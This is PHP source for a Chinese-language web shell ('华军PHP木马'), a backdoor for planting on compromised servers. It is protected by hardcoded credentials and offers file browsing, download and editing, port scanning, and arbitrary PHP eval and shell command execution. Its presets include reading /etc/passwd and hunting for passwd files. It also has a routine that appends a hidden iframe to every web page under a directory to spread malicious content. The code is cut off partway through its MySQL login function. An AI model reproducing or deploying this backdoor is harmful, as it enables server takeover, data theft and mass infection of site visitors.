<?php
error_reporting(7);
ob_start();
$user="ed132e13d1332bf7e2612a0eb848b30a"; //32位md5加密,默认用户为exehack
$pass="ed132e13d1332bf7e2612a0eb848b30a";	//32位md5加密,默认密码为exehack
if (get_magic_quotes_gpc()) {
    $_GET = array_stripslashes($_GET);
    $_POST = array_stripslashes($_POST);
}
if($_GET['s']=='login'){
	setcookie('username',md5($_POST['username']));
	setcookie('password',md5($_POST['password']));
	die('<meta http-equiv="refresh" content="1;URL=?s=main">');
}
if($_GET['s']=='logout'){
	setcookie('username',null);
	setcookie('password',null);
	die('<meta http-equiv="refresh" content="1;URL=?s=">');
}
if($_COOKIE['username']!=$user || $_COOKIE['password']!=$pass){
	die('<form method="post" action="?s=login"><center><br><br><br>华军v1.0 BY：华军 exeHack <br><br>Username: <input type="text" name="username"><br> Password: <input type="password" name="password"> <br><input type="submit" name="submit" value="login"></center></form>');
}
$paget = explode(' ', microtime());
$stime = $paget[1] + $paget[0];
$serverip=$HTTP_SERVER_VARS["REMOTE_ADDR"];
$scanip=$HTTP_POST_VARS['remoteip'];
if (!empty($_GET['fd'])) {
	$fd=$_GET['fd'];
	if (!@file_exists($fd)) {
		echo "<script>window.alert('下载文件不存在');history.go(-1);</script>";
	} else {
		$fn = basename($fd);
		$fn_info = explode('.', $fn);
		$fe = $fn_info[count($fn_info)-1];
		header('Content-type: application/x-'.$fe);
		header('Content-Disposition: attachment; filename='.$fn);
		header('Content-Description: PHP3 Generated Data');
		@readfile($fd);
		exit;
	}
}
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<title>华军PHP木马 and 黑兵社团 exeHack.com</title>
</head>
<style type="text/css">
<!--
#PR {width:850px!important;width:850px}
#Pr table{border-style:solid; border-color:#000000}
td {
	font-family: Arial;
	font-size: 14px;
}
a:link {
	color: #0000FF;
	text-decoration: none;
}
a:visited {
	color: #0000FF;
	text-decoration: none;
}
a:hover {
	color: #ff0000; 
	text-decoration: none;
}
-->
</STYLE>
<body bgcolor="#EDEDED" text="#000000">
<center>
	<div id=PR>
<table border="0">
<td>
<div align="center">
<table width=100% border=0 cellspacing=0 cellpadding=0>
</div></td></table>
	<table width="850">
	<tr>
	<td bgcolor="#AAAAAA">
<div align="center">
	<font face=Webdings size=6><b>!</font>
	<font size="5"> 华军(华军 PHP Shell)至尊版</font><br>
	■服务器IP: <?php echo gethostbyname($_SERVER['SERVER_NAME']);?>
	■运行环境: <?php echo @$_SERVER["SERVER_SOFTWARE"];?> 
	<br>■MySQL: <?php echo @function_exists(mysql_connect) ? "开启" : "关闭" ?>
	■脚本路径: <?php echo str_replace('\\','/',__FILE__);?>
	</b><br></div></td></tr></table>
	<table width="850">
	<tr>
	<td bgcolor="#AAAAAA">
	<div align="center">
【<a href="?s=main">文件管理</a>】
【<a href="?s=port">端口扫描</a>】
【<a href="?s=guama">批量挂马</a>】
【<a href="?s=sfile">文件查找</a>】
【<a href="?s=execute">执行命令</a>】
【<a href="?s=tools">提权工具</a>】
【<a href="?s=sqlexp">数据库操作</a>】
【<a href="?s=logout">退出程序</a></a>】
	</div></td></tr></table>
<?php
$s = isset($_GET['s']) ? $_GET['s'] : "";//测定变量是否设定
$p = isset($_GET['p']) ? $_GET['p'] : "";
$f = isset($_GET['f']) ? $_GET['f'] : "";
$fpath = isset($_GET['path']) ? $_GET['path'] : "";
$path=str_replace('\\','/',dirname(__FILE__)).'/';
if($fpath!=""){!$path && $path = '.';$paths=str_replace('//','/',$_GET['path']);$path1=str_replace('//','/',opath($path,$paths));ofile($path1);}
switch($s){//函数调用
  case "main": ofile($path);break;
  case "redir": redir($p);break;
  case "refile": refile($p);break;
  case "upload": upload($p);break;
  case "edit": edit($p,$f);break;
  case "del": del($p,$f,$_GET['i']);break;
  case "perms": perms($p,$f);break;
  case "ref": ref($p,$f);break;
  case "cfile": cfile($p,$f);break;
  case "deldir": deldir($p,$f);break;
  case "port": port($serverip,$scanip);break;
  case "guama": guama($path);break;
  case "qingma": qingma($path);break;
  case "sfile": sfile($path);break;
  case "execute": execute();break;
  case "phpeval": phpeval();break;
  case "serexp": serexp();break;
  case "sqllogin": sqllogin();break;
  case "sql": sql();break;
  case "sqlexp": sqlexp();break;
  case "tools": tools($path);break;
  case "crack": crack();break;
  case "phpinfo": phpinfo();break;
  default: break;
}
         

//版权
$licensehack=array("67","111","100","101","32","98","121","32","83","112","105","100","101","114","46","32","77","97","107","101","32","105","110","32","67","104","105","110","97","46","32","81","81","56","48","57","51","55","52","51","48","46");
echo '<table width="850"><tr align="center"><td bgcolor="#6959CD"><a target="_blank" href="?s=phpinfo"><b>PHPINFO</b></a> <b>License: ';
foreach($licensehack as $license){
	echo chr();
}
echo '</b>■执行页面用时'.pagetime().'秒■</td></tr></table>';

/*------------函数-------------*/

//文件目录列表
function ofile($path){
$pathw=is_writable($path) ? "可写" : "不可写";
echo '<form method="GET">';
echo ' [<a href="?s=redir&p='.urlencode($path).'">创建目录</a> | ';
echo ' <a href="?s=refile&p='.urlencode($path).'">创建文件</a> | ';
echo ' <a href="?s=upload&p='.urlencode($path).'">上传文件</a></a>]';
echo '</a><br>当前路径('."$pathw".'): <input type="text" name="path" value="'."$path".'" size="68"> ';
echo '<input type="submit" value="Enter"></form>';
echo '<table bgcolor="#000000" cellpadding=1 cellspacing=1 width="850"><tr align="center">';
echo '<td width="430" bgcolor="#6959CD">名称</td>';
echo '<td width="50" bgcolor="#6959CD">下载</td>';
echo '<td width="120" bgcolor="#6959CD">大小</td>';
echo '<td width="250" bgcolor="#6959CD">操作</td>';
echo '</tr>';
$spider=@opendir($path);
while (false !== ($file=@readdir($spider))){
	$filebug = strlen($file)>50 ? substr($file,0,50) : $file;
	$filedir="$path"."$file";
	$dir=@is_dir($filedir);
	if($dir=="1"){
		if($file!="."){
			if($file==".."){
				echo '<tr><td width="430" bgcolor="#AAAAAA">';
				echo '<a href="?path='.urlencode(uppath($filedir)).'"><b>[返回上级目录]</b></a></td>';
				echo '<td width="50" bgcolor="#AAAAAA"><div align="center">===</div></td>';
				echo '<td width="120" bgcolor="#AAAAAA"><div align="center">===</div></td>';
				echo '<td width="250" bgcolor="#AAAAAA"><div align="center">===</div></td></tr>'."\n";
			}
			else{
				$dirw=is_writable($filedir) ? "可写" : "不可写";
				echo '<tr><td width="430" bgcolor="#AAAAAA">';
				echo '<font face="wingdings" size="3">1</font><a href="?path='.urlencode($filedir).'">'."$filebug".'</a>';
				echo '<td width="50" bgcolor="#AAAAAA"><div align="center">'."$dirw".'</div></td>';
				echo '<td width="120" bgcolor="#AAAAAA"><div align="center">dir</div></td>';
				echo '<td width="250" bgcolor="#AAAAAA"><div align="center">';
				echo '[<a href="#" onclick="if(confirm(\'确认要删除目录'."$file".'吗?\')==true) document.location.href=\'?s=deldir&p='.urlencode($path).'&f='.urlencode($file).'\';">删除</a>] ';
				echo '[<a href="?s=perms&p='.urlencode($path).'&f='.urlencode($file).'">属性</a>] ';
				echo '[<a href="?s=ref&p='.urlencode($path).'&f='.urlencode($file).'">改名</a>]</div></td></tr>'."\n";
			}
		}
	}
}
@closedir($spider);
$spider=@opendir($path);
while (false !== ($file=@readdir($spider))){
	$filebug = strlen($file)>50 ? substr($file,0,50) : $file;
	$filedir="$path"."$file";
	$dir=@is_dir($filedir);
	$pathg=str_replace('\\', '/', dirname(__FILE__)).'/';
	$fileurl = str_replace($pathg,'',$path);
	if($dir=="0"){
		if($file!='..'){
		$fsize=@filesize($filedir);
		$fsize=$fsize/1024;
		$fsize=@number_format($fsize, 3);
			echo '<tr><td width="430" bgcolor="#AAAAAA">';
			echo '<font face="wingdings" size="3">4</font> <a target="_blank" href="./'."$fileurl"."$file".'">'."$filebug".'</a></td>';
			echo '<td width="50" bgcolor="#AAAAAA"><div align="center"><a href="?fd='.urlencode($filedir).'">下载</a></td>';
			echo '<td width="120" bgcolor="#AAAAAA"><div align="center">'."$fsize".' KB</td>';
			echo '<td width="250" bgcolor="#AAAAAA"><div align="center">';
			echo '[<a href="?s=edit&p='.urlencode($path).'&f='.urlencode($file).'">编辑</a>] ';
			echo '[<a href="#" onclick="if(confirm(\'确认要删除文件'."$file".'吗?\')==true) document.location.href=\'?s=del&p='.urlencode($path).'&f='.urlencode($file).'\';">删除</a>] ';
			echo '[<a href="?s=perms&p='.urlencode($path).'&f='.urlencode($file).'">属性</a>] ';
			echo '[<a href="?s=ref&p='.urlencode($path).'&f='.urlencode($file).'">改名</a>] [<a href="?s=cfile&p='.urlencode($path).'&f='.urlencode($file).'">拷贝</a>]</td></tr>'."\n";
		}
	}
}
@closedir($spider);
echo '</table>';
}
//返回
function back(){
	echo '<br><a href="javascript:history.go(-1);">[返回]</a><br><br>';
}
function fanhui($p){
	echo '<br><a href="?path='.urlencode($p).'">[返回]</a><br><br>';
}
//处理路径
function opath($scriptpath,$nowpath) {
	if ($nowpath == '.') {
		$nowpath = $scriptpath;
	}
	$nowpath = str_replace('\\', '/', $nowpath);
	$nowpath = str_replace('//', '/', $nowpath);
	if (substr($nowpath, -1) != '/') {
		$nowpath = $nowpath.'/';
	}
	return $nowpath;
}
function uppath($nowpath) {
	$pathdb = explode('/', $nowpath);
	$num = count($pathdb);
	if ($num > 2) {
		unset($pathdb[$num-1],$pathdb[$num-2]);
	}
	$uppath = implode('/', $pathdb).'/';
	$uppath = str_replace('//', '/', $uppath);
	return $uppath;
}
//创建目录
function redir($repath){
echo "<br>创建到当前路径: $repath <br>";
echo '<form method="POST" >目录名称:<input type="text" name="redir"><input type="submit" name="subdir" value="确定"></form>';
fanhui($repath);
	if($_POST['subdir']){
		$redir=$_POST['redir'];
		$repathok="$repath"."$redir";
		if(stristr($redir,'/')){
			echo '<br>目录名错误<br><br>';
		}
		elseif(file_exists($repathok)){
			echo '<br>目录'."$redir".'已存在<br><br>';
		}
		else{
			$msg=@mkdir($repathok,0777) ? '<br>目录'."$redir".'创建成功<br><br>' : '<br>目录'."$redir".'创建失败<br><br>';
			echo "$msg";
		}
	}
}
//创建文件
function refile($ref){
echo '<form method="POST" >路径文件名: <input type="text" name="refile" size="65" value="'."$ref".'spider.php"><br>';
echo '<textarea name="text" COLS="75" ROWS="18" >请输入内容</textarea><br>';
echo '<input type="submit" name="subfile" value="保存"></form>';	fanhui($ref);
	if($_POST['subfile']){
		$refile=$_POST['refile'];	$text=$_POST['text'];
		$fp=@fopen($refile,'w');
		if($fp==null){
			echo '<br>创建文件失败!<br><br>';
		}
		else{
		@fwrite($fp,stripslashes($text));
		@fclose($fp);
		echo "<script>window.alert('创建文件"."$refile"."成功');history.go(-1);</script>";
		}
	}
}
//上传文件
function upload($pathname){
	echo '<br>允许最大单个上传文件:'.@get_cfg_var('upload_max_filesize');
	echo '<br><div align="center"><form method="POST" enctype="multipart/form-data">';
	echo '本地文件: <input name="upfile" type="file" size="30"> <input type="submit" name="upok" value="上传"><br>';
	echo '上传到路径: <input name="up" type="text" value="'."$pathname".'" size="45"></form>';	fanhui($pathname);
	if($_POST['upok']){
		$uppath=$_POST['up'];
		echo @copy($_FILES['upfile']['tmp_name'],"".$uppath."/".$_FILES['upfile']['name']."") ? "上传文件{$_FILES['upfile']['name']}成功!<br><br>" : "上传文件{$_FILES['upfile']['name']}失败!<br><br>";
	}
}
//编辑文件
function edit($p,$f){
	$ep="$p"."$f";
	$hackfp=@fopen($ep,'r');
	$redspider=@fread($hackfp, filesize($ep));
	$redspider=htmlspecialchars($redspider);
	echo '<br>编辑文件:'."$ep";
	echo '<br><form method="POST">';
	echo '<textarea name="ftext" COLS="75" ROWS="18" >'."$redspider".'</textarea><br>';
	echo '<input type="submit" name="editok" value="保存"></form>';	back();
	if($_POST['editok']){
		$fp=@fopen($ep,'w');
		if($fp==null){
			echo '保存失败<br><br>';
		}
		else{
			$ftext=$_POST['ftext'];
			fwrite($fp,stripslashes($ftext));
			fclose($fp);
			echo "<script>window.alert('保存文件"."$ep"."成功');history.go(-1);</script>";
		}
	}
}
//删除文件
function del($dp,$df,$i){
	$delfile="$dp"."$df";
	if(!file_exists($delfile)) {
		echo '<br>文件'."$df".'不存在! ';
		if($i=="1")
		back();
		else
		fanhui($dp);
	} 
	else {
		$msg = @unlink($delfile) ? '<br>文件'."$df".'删除成功!<br>' : '<br>删除失败!<br>';
		echo "$msg";
		if($i=="1")
		back();
		else
		fanhui($dp);
	}
}
//属性
function perms($pp,$pf){
	$pfile="$pp"."$pf";
	$pold=substr(base_convert(fileperms($pfile),10,8),-4);
	$ftime=@date("Y-n-d H:i:s",filectime("$pfile"));
	echo '<br>'."$pfile".' 的当前属性为: '."($pold)".' &nbsp;&nbsp;&nbsp;修改日期: '."$ftime".'<br><form method="POST">';
	echo '修改属性: <input type="text" name="pfo" value="'."$pold".'" > ';
	echo '<input type="submit" name="subperms" value="修改"></form>';	fanhui($pp);
	if($_POST['subperms']){
		$pnew=$_POST['pfo'];
		$fileperm=base_convert($pnew,8,10);
		$msg=@chmod($pfile,$fileperm)?"更改成功!":"更改失败!";
		echo "<script>window.alert('文件"."$pfile"."属性"."$msg"."');history.go(-1);</script>";
	}
}
//重命名
function ref($rp,$rf){
	$rpf="$rp"."$rf";
	echo '<br><form method="POST">路径:'."$rp".'<br>将('."$rf".') 重命名为: <input type="text" name="newf" value="'."$rf".'">';
	echo '<input type="submit" name="subref" value="修改"></form>';	fanhui($rp);
	if($_POST['subref']){
		$newf=$_POST['newf'];
		$newfile="$rp"."$newf";
		$msg = file_exists($rpf) ? (@rename($rpf,$newfile) ? "重命名为{$newf}成功" : "重命名为{$newf}失败") : "不存在";
		echo "<script>window.alert('"."$rf"."$msg"."');history.go(-1);</script>";
	}
}
//拷贝文件
function cfile($cp,$cf){
	$cpf="$cp"."$cf";
	echo '<br>文件: '."$cpf".'<br><form method="POST">拷贝到: <input type="text" name="newf" size="35" value="'."$cpf".'"> ';
	echo '<input type="submit" name="subcfile" value="确定"></form>';
	fanhui($cp);
	if($_POST['subcfile']){
		$newf=$_POST['newf'];
		if(file_exists($newf)){
			echo '失败:文件'."$newf".'已存在<br><br>';
		}
		else{
			$msg = @copy($cpf,$newf) ? '文件 '."$cpf".' 拷贝到 '."$newf".' 成功!<br><br>' : '失败,路径出错或不可写!<br><br>';
			echo "$msg";
		}
	}
}
//删除目录
function deldir($dp,$dd){
	$deldir="$dp"."$dd";
	if(isset($deldir)) {
		$msg = file_exists($deldir)?(deltree($deldir)?"删除成功":"删除失败"):"不存在";
		echo '<br><br>目录'."$dd"."$msg";	fanhui($dp);
	}
}
function deltree($dpath){ 
	$mydir=@opendir($dpath); 
	while($file=@readdir($mydir)){ 
		if((is_dir("$dpath/$file")) && ($file!=".") && ($file!="..")) { 
			if(!deltree("$dpath/$file")) return false;
		}else if(!is_dir("$dpath/$file")){
			@chmod("$dpath/$file", 0777);
			if(!@unlink("$dpath/$file")) return false;
		}
	} 
	@closedir($mydir); 
	@chmod("$dpath", 0777);
	if(!@rmdir($dpath)) return false;
	return true;
}
//页面执行时间
function pagetime(){
	global $stime;
	$paget = explode(' ', microtime());
	$ptime = number_format(($paget[1] + $paget[0] - $stime), 6);
	return $ptime;
}
function array_stripslashes(&$array) {
    while(list($key,$var) = each($array)) {
        if ((strtoupper($key) != $key || ''.intval($key) == "$key") && $key != 'argc' && $key != 'argv') {
            if (is_string($var)) $array[$key] = stripslashes($var);
            if (is_array($var)) $array[$key] = array_stripslashes($var);  
        }
    }
    return $array;
}
//端口扫描
function port($serverip,$scanip){
if (!empty($scanip)){ 
$ips=explode(".",$scanip); 
if (intval($ips[0])<1 or intval($ips[0])>255 or intval($ips[3])<1 or intval($ips[3]>255)) err(); 
if (intval($ips[1])<0 or intval($ips[1])>255 or intval($ips[2])<0 or intval($ips[2]>255)) err(); 
$closed='此端口目前处于关闭状态'; 
$opened='<font color=red>此端口目前处于打开状态</font>'; 
$close="关闭"; 
$open="<font color=red>打开</font>"; 
$port=array(21,23,25,79,80,110,135,137,138,139,143,443,445,1433,3306,3389,43958); 
$msg=array('Ftp','Telnet','Smtp','Finger','Http','Pop3','Location Service','Netbios-NS','Netbios-DGM','Netbios-SSN','IMAP','Https','Microsoft-DS','MSSQL','MYSQL','Terminal Services','Serv-U');
echo "<br>扫描目标IP: $scanip <br><br>"; 
echo '<table cellpadding=5 cellspacing=1>'; 
echo "<tr align=center bgcolor=#6959CD>"; 
echo "<td>端口</td>"; 
echo "<td>服务</td>"; 
echo "<td>结果</td>"; 
echo "<td>描述</td>"; 
echo "</tr>"; 
for($i=0;$i<sizeof($port);$i++) 
{ 
$fp = @fsockopen($scanip, $port[$i], &$errno, &$errstr, 1); 
  if (!$fp) { 
     echo "<tr bgcolor=#AAAAAA><td align=center>".$port[$i]."</td><td>".$msg[$i]."</td><td align=center>".$close."</td><td>".$closed."</td></tr>\n"; 
  } else { 
     echo "<tr bgcolor=#AAAAAA><td align=center>".$port[$i]."</td><td>".$msg[$i]."</td><td align=center>".$open."</td><td>".$opened."</td></tr>"; 
  } 
}
echo "<tr><td colspan=4 align=center bgcolor=#6959CD>"; 
echo "<a href=?s=port>继续扫描>> </a>";
echo '扫描用时: '.pagetime().'秒</td></tr></table>';
exit;
}
echo "<br><form method=POST>";
echo "<b>请输入IP: </b><input type=text name=remoteip size=30 value=127.0.0.1>"; 
echo "<input type=submit value=扫描 name=scan>";  
echo "</form><br>"; 
}
function err(){
   die("<br>该IP地址不合法<br><a href=javascript:history.back(1)>[返回]</a>");
}
//批量挂马
function guama($redzz1){
	$redzzz=str_replace('\\','/',__FILE__);
	echo '<br>[<a href="?s=guama">批量挂马</a> | <a href="?s=qingma">批量清马</a>]<br><form method="POST"><br>';
	echo '<b>从当前路径开始挂马: </b><input type="text" name="path" size="60" value="'."$redzz1".'"><br><br>';
	echo '<b>插入代码: </b><textarea name="text" COLS="70" ROWS="6" ><iframe src="http://localhost/hack.html" width="1" height="1" frameborder="1"></iframe></textarea><br>';
	echo '<br><input type="submit" name="submit" value="开始挂马"></div><br></form>';
	if($_POST['submit']){
		echo '<b>目标文件：</b><br>';
		$path=$_POST['path'];
		$red=$_POST['text'];
		$redzz="\n".stripslashes($red);
		hongzz($path,$redzz,$redzzz);
	}
}
function hongzz($path,$redzz,$redzzz){
	$spider=@opendir($path);
	if($spider=="0")
	die('<br><font color="#ff0000">提示: 路径出错或不存在</font><br><br>');
	while ($file=@readdir($spider)){
		if($file!='.' && $file!='..'){
			$filepath="$path"."/"."$file";
			$filepaths=str_replace('//','/',$filepath);
			if(@is_dir($filepaths)=="1"){
				$pathss="$path"."/"."$file"."/";
				$pathsss=str_replace('//','/',$pathss);
				hongzz($pathsss,$redzz,$redzzz);
			}
			if(@is_dir($filepaths)=="0"){
				if(hack($file)!=true)
				{echo '<font color="#ff0000">忽略---</font>'."$filepaths".'<br>';}
				elseif(@fopen($filepaths,'a')==null){
					echo '<font color="#CDAD00">失败---</font>'."$filepaths".'---文件或目录不可写!<br>';
				}
				elseif($filepaths!=$redzzz){
					$fp=@fopen($filepaths,'a');
					@fwrite($fp,$redzz);
					@fclose($fp);
					echo '<font color="#00c000">成功---</font>'."$filepaths".'<br>';
				}
			}
		}
	}
	@closedir($spider);
}
function hack($f){
	$img=array(".html",".shtml",".htm",".asp",".php",".jsp",".cgi",".aspx");
	foreach($img as $i){
		if(stristr($f,$i))
		return true;
	}
}
//批量清马
function qingma($redzz1){
	$redzzz=str_replace('\\','/',__FILE__);
	echo '<br>[<a href="?s=guama">批量挂马</a> | <a href="?s=qingma">批量清马</a>]<br><form method="POST"><br>';
	echo '<b>从当前路径开始清马: </b><input type="text" name="path" size="60" value="'."$redzz1".'"><br><br>';
	echo '<b>清除代码: </b><textarea name="text" COLS="70" ROWS="6" ><iframe src="http://localhost/hack.html" width="1" height="1" frameborder="1"></iframe></textarea><br>';
	echo '<br><input type="submit" name="submit" value="开始清除"></div><br></form>';
	if($_POST['submit']){
		echo '<b>已清除文件：</b><br>';
		$path=$_POST['path'];
		$redzz=stripslashes($_POST['text']);
		sunchao($path,$redzz,$redzzz);
	}
}
function sunchao($path,$redzz,$redzzz){
	$spider=@opendir($path);
	if($spider=="0")
	die('<br><font color="#ff0000">提示: 路径出错或不存在</font><br><br>');
	while ($file=@readdir($spider)){
		if($file!='.' && $file!='..'){
			$filepath="$path"."/"."$file";
			$filepaths=str_replace('//','/',$filepath);
			if(@is_dir($filepaths)=="1"){
				$pathss="$path"."/"."$file"."/";
				$pathsss=str_replace('//','/',$pathss);
				sunchao($pathsss,$redzz,$redzzz);
			}
			if(@is_dir($filepaths)=="0"){
				if(hack($file)!=true)
				{echo '<font color="#ff0000">忽略---</font>'."$filepaths".'<br>';}
				elseif(@fopen($filepaths,'a')==null){
					echo '<font color="#CDAD00">失败---</font>'."$filepaths".'---文件或目录不可写!<br>';
				}
				elseif($filepaths!=$redzzz){
					$fp=@fopen($filepaths,'r');
					$redspider=@fread($fp,filesize($filepaths));
					if(stristr($redspider,$redzz)){
						$fp=@fopen($filepaths,'w');
						$sunchao=str_replace($redzz,'',$redspider);
						@fwrite($fp,$sunchao);
						echo '<font color="#00c000">成功---</font>'."$filepaths".'<br>';
					}
					@fclose($fp);
				}
			}
		}
	}
	@closedir($spider);
}
//查找文件
function sfile($spath){
	echo '<form method="POST"><br>';
	echo '<b>从当前路径开始查找: </b><input type="text" name="scanpath" size="49" value="'."$spath".'"><br><br>';
	echo '<b>查找方式: &nbsp;&nbsp; </b><input type="radio" name="scanf" value="1" checked>文件名 &nbsp;&nbsp;&nbsp; <input type="radio" name="scanf" value="2">包含文字';
	echo '<br><br><b>请输入关键字: </b><input type="text" name="files" size="50" value="">';
	echo ' <input type="submit" name="scanfile" value="查找"></div><br></form>';
	if($_POST['scanfile']){
		$scanpath=$_POST['scanpath'];
		$sn=$_POST['scanf'];
		$files=$_POST['files'];
		if($files==''){
			echo '请输入关键字';
		}
		elseif($scanpath==''){
			echo '请输入查找路径';
		}
		else
		{echo '查找路径: '."$scanpath".'<br>关键字: '.htmlentities($files).'<br>找到文件: <br>';$scanpath="$scanpath".'/'; scanfiles($scanpath,$sn,$files);}
	}
}
function scanfiles($scanpatho,$sn,$files){
	$scanpath=str_replace('//','/',$scanpatho);
	$spider=@opendir($scanpath);
	if($spider=="0")
	die('<br><font color="#ff0000">提示: 路径出错或不存在</font><br><br>');
	while ($file=@readdir($spider)){
		if($file!='.' && $file!='..'){
		$filepath="$scanpath"."/"."$file";
		$filepatho=str_replace('//','/',$filepath);
			if(@is_dir($filepatho)=="1"){
				$pathoo="$scanpath"."/"."$file"."/";
				$pathooo=str_replace('//','/',$pathoo);
				scanfiles($pathooo,$sn,$files);
			}
			if(@is_dir($filepatho)=="0"){
				if($sn=="1"){
					if(stristr($file,$files)){
						echo "$filepatho".' [<a href="?s=edit&p='.urlencode($scanpath).'&f='.urlencode($file).'">编辑</a>] ';
						echo '[<a href="#" onclick="if(confirm(\'确认要删除文件'."$file".'吗?\')==true) document.location.href=\'?s=del&p='.urlencode($scanpath).'&f='.urlencode($file).'&i=1\';">删除</a>]<br>'."\n";
					}
				}
				if($sn=="2"){
					$sfp=@fopen($filepatho,'r');
					$redspider=@fread($sfp,filesize($filepatho));
					if(stristr($redspider,$files)){
						echo "$filepatho".' [<a href="?s=edit&p='.urlencode($scanpath).'&f='.urlencode($file).'">编辑</a>] ';
						echo '[<a href="#" onclick="if(confirm(\'确认要删除文件'."$file".'吗?\')==true) document.location.href=\'?s=del&p='.urlencode($scanpath).'&f='.urlencode($file).'&i=1\';">删除</a>]<br>'."\n";
					}
					@fclose($sfp);
				}
			}
		}
	}
	@closedir($spider);
}
//执行命令
function phpeval(){
	echo '<div align="center"><br>[<a href="?s=execute">执行Shell命令</a> | <a href="?s=phpeval">执行PHP脚本</a>]';
  echo("<form method='POST'>");
  echo("<textarea name='phpexec' rows=15 cols=100>");
  if(!$_POST['phpexec']){echo("/*不用写<? ?>标签*/\n");}
  echo($_POST['phpexec'] . "</textarea>\n<br>\n");
  echo("<input type='submit' value='执行'>");
  echo("</form>");
  if($_POST['phpexec']){
    echo("<textarea rows=15 cols=100>");
    eval($_POST['phpexec']);
    echo("</textarea><br><br>");
  }
}
function execute(){
	echo '<div align="center"><br>[<a href="?s=execute">执行Shell命令</a> | <a href="?s=phpeval">执行PHP脚本</a>]';
  echo("<br><form name='CMD' method='POST'>");
  echo("<b>执行方法:</b><select name='sunc'>");
  echo("<option value='1'>exec</option>");
  echo("<option value='2'>WScript.shell</option><option value='3'>proc_open</option></select>");
  echo(" <b>CMD路径:</b><input name='cmdp' type='text' size='35' value='c:\winnt\system32\cmd.exe'><br><br>");
  echo("<b>命令/参数:</b><input name='cmd' type='text' size='45'> ");
  echo("<select name='precmd'>");
  $precmd = array('常用命令'=>'','Read /etc/passwd'=>'cat /etc/passwd','Open ports'=>'netstat -an',
                  'Running Processes'=>'ps -aux', 'Uname'=>'uname -a', 'Get UID'=>'id',
                  'Create Junkfile (/tmp/z)'=>'dd if=/dev/zero of=/tmp/z bs=1M count=1024',
                  'Find passwd files'=>'find / -type f -name passwd');
  $capt = array_flip($precmd);
  foreach($precmd as $c){echo("<option value='" . $c . "'>" . $capt[$c] . "\n");}
  echo("</select>\n");
  echo(" <input type='submit' value='执行'>\n");
  echo("</form>\n");
  if($_POST['cmd'] != ""){$x = $_POST['cmd'];}
  elseif($_POST['precmd'] != ""){$x = $_POST['precmd'];}
  echo("<textarea rows=15 cols=90>");
  if($x==""){
  	echo 'exec方法:利用函数exec()实现'."\n";
  	echo 'WScript.shell方法:必须服务器支持WScript.shell组件'."\n";
  	echo 'proc_open方法:必须有cmd路径,其他方法可无cmd路径'."\n\n".'注意:使用常用命令,不用填写[命令/参数]'."\n\n";
  	echo '如果程序中有BUG,或缺少什么功能,别忘了告诉我(QQ:858382187)哦.'."\n".'BY 鬼鬼';
  }
  elseif($_POST['sunc']=='1'){
  	$cmd = exec($x, $result);
  	foreach($result as $line){echo($line . "\n");}
	}
  elseif($_POST['sunc']=='2'){
    $wsh = new COM('WScript.shell') or die('不支持WScript.shell');
		$exec = $wsh->exec ("cmd.exe /c ".$x."");
		$stdout = $exec->StdOut();
		$stroutput = $stdout->ReadAll();
		echo $stroutput;	
  }
  elseif($_POST['sunc']=='3'){
		$descriptorspec = array(0 => array("pipe", "r"),1 => array("pipe", "w"),2 => array("pipe", "w"));
		$process = proc_open("".$_POST['cmdp']."", $descriptorspec, $pipes);
		if (is_resource($process)) {
    fwrite($pipes[0], "".$x."\r\n");
    fwrite($pipes[0], "exit\r\n");
    fclose($pipes[0]);
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    while (!feof($pipes[2])) {
        echo fgets($pipes[2], 1024);
    }
    fclose($pipes[2]);
    proc_close($process);
		}
		else {
			system($x);
		}
	}
	echo("</textarea><br><br>");
}
//连接MYSQL
function sqlexp(){
	$servername = $_POST['servername'];
	$dbport = $_POST['dbport'];
	$dbusername = $_POST['dbusername'];
	$dbpassword = $_POST['dbpassword'];
	$dbname = $_POST['dbname'];
	$servername = isset($servername) ? $servername : '127.0.0.1';
	$dbport = isset($dbport) ? $dbport : '3306';
	$dbusername = isset($dbusername) ? $dbusername : 'root';
	$dbpassword = isset($dbpassword) ? $dbpassword : '';
	$dbname = isset($dbname) ? $dbname : '';
	echo '<div align="center"><br>[<a href="?s=sqlexp">执行SQL语句</a> | <a href="?s=sqllogin">连接MYSQL</a>]
  	<br><form action="?s=sqlexp" method="POST">
    <div align="center">数据库地址:<input name="servername" type="text" value="'."$servername".'">
    端口:<input name="dbusername" type="text" size="15" value="'."$dbport".'">
    用户:<input name="dbusername" type="text" size="15" value="'."$dbusername".'"><br>
    密码:<input name="dbpassword" type="text" size="15" value="'."$dbpassword".'">
    数据库名:<input name="dbname" type="text" size="15" value="'."$dbname".'">
    <input name="connect" type="submit" value="连接">
  	<div align="center"><textarea name="sql_query" cols="85" rows="10"></textarea>
  	<div align="center"><input type="submit" name="doquery" value="执行"></form>';
	if($_POST['connect']) {
		if (@mysql_connect("{$servername}:{$dbport}","$dbusername","$dbpassword") AND @mysql_select_db($dbname)) {
			echo "<br>数据库连接成功!<br><br>";
		} else {
			echo mysql_error();
		}
	}
	elseif($_POST['doquery']) {
		@mysql_connect("{$servername}:{$dbport}","$dbusername","$dbpassword") or die("<br>数据库连接失败<br><br>");
		@mysql_select_db($dbname) or die("<br>选择数据库失败<br><br>");
		$result = @mysql_query($_POST['sql_query']);
		if ($result) {
			echo "<br>SQL语句成功执行<br><br>";
		}else{
			echo "<br>出错: ".mysql_error().'<br><br>';
		}
		mysql_close();
	}
	echo '<br><br><b>常用MYSQL语句:</b><br><br>';
  echo ("<table><tr><td>创建: CREATE TABLE `表名` (`字段` VARCHAR( 长度 ) NOT NULL ) CHARACTER SET = latin10; 
	<hr>更改: ALTER TABLE `表名` CHANGE `字段` `字段` VARCHAR( 长度 ) 
	<hr>插入: INSERT INTO `表名` ( `字段` ) VALUES (函数( '长度' ) ); 
	<hr>搜索: SELECT * FROM `表名` WHERE 21  LIMIT 0 , 30 
	<hr>浏览: SELECT * FROM `表名`  LIMIT 0 , 30 
	<hr>清空: TRUNCATE TABLE `表名` 
	<hr>删除: DROP TABLE `表名`</td></tr></table><br>");
}
function sqllogin(){
	echo '<br>[<a href="?s=sqlexp">执行SQL语句</a> | <a href="?s=sqllogin">连接MYSQL</a>]<br><br>';
  session_start();
  if($_SESSION['isloggedin'] == "true"){
    header("Location: ?s=sql");
  }
  echo("<form method='post' action='?s=sql'>");
  echo("用户:<input type='text' name='un' size='30' value='root'><br><br>\n");
  echo("密码:<input type='text' name='pw' size='30'><br><br>\n");
